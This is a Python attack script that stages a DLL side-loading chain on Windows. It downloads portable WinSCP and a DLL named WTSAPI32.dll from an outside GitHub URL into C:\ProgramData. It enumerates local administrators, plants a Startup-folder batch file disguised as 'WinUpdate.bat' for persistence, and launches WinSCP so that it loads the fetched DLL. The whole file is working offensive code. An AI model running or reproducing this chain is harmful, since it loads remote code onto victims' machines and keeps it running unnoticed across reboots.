import os
import shutil
import subprocess
import urllib.request
import zipfile

# ===============================================
# CONFIGURATION
# ===============================================
dll_url    = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/dll/WTSAPI32.dll"
app_url    = "https://winscp.net/download/WinSCP-6.5.5-Portable.zip"
stage_dir  = r"C:\ProgramData"
app_zip    = os.path.join(stage_dir, "winscp.zip")
app_dir    = os.path.join(stage_dir, "WinSCP")
app_exe    = os.path.join(app_dir, "WinSCP.exe")
dll_path   = os.path.join(app_dir, "WTSAPI32.dll")
log_path   = os.path.join(stage_dir, "stage1.log")
bat_name   = "WinUpdate.bat"

# ===============================================
# PHASE 1: Stage WinSCP (download + extract)
# ===============================================
if os.path.exists(app_exe):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] WinSCP already staged at {app_exe}\n")
else:
    try:
        urllib.request.urlretrieve(app_url, app_zip)
        with zipfile.ZipFile(app_zip, 'r') as z:
            z.extractall(app_dir)
        os.remove(app_zip)
        with open(log_path, 'a') as f:
            f.write(f"[OK] WinSCP staged to {app_dir}\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] WinSCP download failed: {e}\n")

# ===============================================
# PHASE 2: Stage DLL (as WTSAPI32.dll for side-load)
# ===============================================
if os.path.exists(dll_path):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] DLL already staged at {dll_path}\n")
else:
    try:
        urllib.request.urlretrieve(dll_url, dll_path)
        with open(log_path, 'a') as f:
            f.write(f"[OK] DLL staged as WTSAPI32.dll at {dll_path}\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] DLL download failed: {e}\n")

# ===============================================
# PHASE 3: Local Admin Enumeration (always runs)
# ===============================================
try:
    result = subprocess.run(
        ['net', 'localgroup', 'Administrators'],
        capture_output=True, text=True
    )
    with open(log_path, 'a') as f:
        f.write("=== Local Admin Group ===\n")
        f.write(result.stdout)
        f.write("=========================\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"[ERR] Enumeration failed: {e}\n")

# ===============================================
# PHASE 4: Persistence (Startup .bat -> WinSCP.exe)
# ===============================================
startup_folder = os.path.expandvars(
    r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
)
bat_path = os.path.join(startup_folder, bat_name)
bat_content = f'@echo off\n"{app_exe}"'

if os.path.exists(bat_path):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] Startup .bat already exists at {bat_path}\n")
else:
    try:
        with open(bat_path, 'w') as f:
            f.write(bat_content)
        with open(log_path, 'a') as f:
            f.write(f"[OK] Persistence: Startup .bat -> WinSCP.exe (side-loads WTSAPI32.dll)\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Startup persistence failed: {e}\n")

# ===============================================
# PHASE 5: Trigger Side-Load (run WinSCP.exe now)
# ===============================================
try:
    subprocess.Popen([app_exe])
    with open(log_path, 'a') as f:
        f.write(f"[OK] Side-load triggered: {app_exe} -> WTSAPI32.dll loaded\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"[ERR] Side-load trigger failed: {e}\n")
